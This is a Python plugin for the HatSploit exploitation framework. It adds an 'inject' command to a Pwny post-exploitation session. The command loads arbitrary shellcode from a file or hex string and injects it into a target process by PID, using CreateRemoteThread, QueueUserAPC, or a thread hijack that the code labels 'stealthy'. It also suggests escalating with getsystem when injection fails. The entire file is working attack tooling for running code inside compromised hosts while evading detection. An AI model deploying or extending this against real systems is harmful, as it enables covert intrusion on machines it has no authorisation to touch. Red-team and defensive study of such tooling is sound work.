"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

INJECT_BASE = 25

INJECT_SHELLCODE = tlv_custom_tag(API_CALL_STATIC, INJECT_BASE, API_CALL)
TLV_TYPE_INJECT_SC_TECHNIQUE = tlv_custom_type(TLV_TYPE_INT, INJECT_BASE, API_TYPE)

INJECT_TECH_CRT = 0
INJECT_TECH_APC = 1
INJECT_TECH_HIJACK = 2
INJECT_TECH_DEFAULT = INJECT_TECH_HIJACK

INJECT_TECHNIQUE_MAP = {
    'hijack': INJECT_TECH_HIJACK,
    'apc': INJECT_TECH_APC,
    'crt': INJECT_TECH_CRT,
}

INJECT_TECHNIQUE_NAMES = {
    INJECT_TECH_CRT: 'CreateRemoteThread (noisy)',
    INJECT_TECH_APC: 'QueueUserAPC (moderate)',
    INJECT_TECH_HIJACK: 'Thread Hijack (stealthy)',
}


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Inject Plugin",
            'Plugin': "inject",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Inject shellcode into a remote process.",
        })

        self.commands = [
            Command({
                'Category': "exploit",
                'Name': "inject",
                'Description': "Inject shellcode into a remote process.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('pid',),
                        {
                            'help': "Target process ID.",
                            'type': int,
                        }
                    ),
                    (
                        ('-f', '--file'),
                        {
                            'help': "Local file containing raw shellcode.",
                            'metavar': 'PATH',
                        }
                    ),
                    (
                        ('-x', '--hex'),
                        {
                            'help': "Shellcode as hex string (e.g. 90909090cc).",
                            'metavar': 'HEX',
                        }
                    ),
                    (
                        ('-t', '--technique'),
                        {
                            'help': "Injection technique: hijack (default, stealthy), "
                                    "apc (moderate), crt (legacy, noisy).",
                            'metavar': 'TECH',
                            'choices': list(INJECT_TECHNIQUE_MAP.keys()),
                            'default': 'hijack',
                        }
                    ),
                ]
            })
        ]

    def inject(self, args):
        if args.file:
            try:
                with open(args.file, 'rb') as f:
                    shellcode = f.read()
            except Exception as e:
                self.print_error(f"Failed to read file: {e}")
                return

        elif args.hex:
            try:
                shellcode = bytes.fromhex(args.hex)
            except ValueError:
                self.print_error("Invalid hex string!")
                return
        else:
            self.print_error("Specify shellcode via -f/--file or -x/--hex")
            return

        if len(shellcode) == 0:
            self.print_error("Shellcode is empty!")
            return

        technique = INJECT_TECHNIQUE_MAP.get(args.technique, INJECT_TECH_DEFAULT)
        tech_name = INJECT_TECHNIQUE_NAMES.get(technique, args.technique)

        self.print_process(
            f"Injecting {len(shellcode)} bytes into PID {args.pid} "
            f"[{tech_name}]..."
        )

        result = self.session.send_command(
            tag=INJECT_SHELLCODE,
            plugin=self.plugin,
            args={
                TLV_TYPE_PID: args.pid,
                TLV_TYPE_BYTES: shellcode,
                TLV_TYPE_INJECT_SC_TECHNIQUE: technique,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Injection failed! Check PID exists and you have "
                "sufficient privileges (try getsystem first)."
            )
            return

        self.print_success(f"Shellcode injected and executing in PID {args.pid}.")

    def load(self):
        pass
